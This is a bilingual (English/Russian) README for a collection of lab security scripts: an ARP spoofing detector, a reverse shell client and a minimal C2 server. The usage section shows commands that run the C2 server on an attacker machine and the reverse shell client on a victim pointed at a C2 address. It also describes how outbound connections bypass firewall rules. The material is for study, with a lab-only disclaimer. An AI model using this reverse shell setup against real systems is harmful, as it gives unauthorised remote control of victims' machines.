# scripts

Standalone security scripts from lab work and study. Code comments are in English;
descriptions below are bilingual (EN / RU).

> For study and authorised lab use only. Do not run against systems you don't own.
> Только для обучения и авторизованных лаб. Не запускать против чужих систем.

## network/

| Script | EN | RU |
|---|---|---|
| `arp_spoof_detector.py` | Detects ARP spoofing by tracking MAC→IP changes (Scapy) | Детект ARP-спуфинга по смене MAC→IP (Scapy) |
| `reverse_shell_client.py` | Reverse shell client that connects back to a C2 | Reverse shell клиент, подключается к C2 |
| `c2_shell_server.py` | Minimal C2 server: sends commands, reads results | Минимальный C2-сервер: шлёт команды, читает результат |

### Usage / Запуск
```bash
# ARP detector (needs root for sniffing / нужен root для сниффинга)
sudo python3 network/arp_spoof_detector.py

# C2 pair (lab only / только лаб):
python3 network/c2_shell_server.py            # on attacker box / на машине атакующего
python3 network/reverse_shell_client.py <c2_ip>   # on victim/bot / на боте
```

**EN:** These illustrate socket mechanics (client `connect` vs server
`bind/listen/accept`), reverse-shell flow (victim dials out to bypass inbound
firewall rules), and a Scapy-based blue-team detector.

**RU:** Скрипты показывают механику сокетов (клиент `connect` vs сервер
`bind/listen/accept`), схему reverse shell (жертва звонит наружу, обходя входящие
правила фаервола) и blue-team детектор на Scapy.
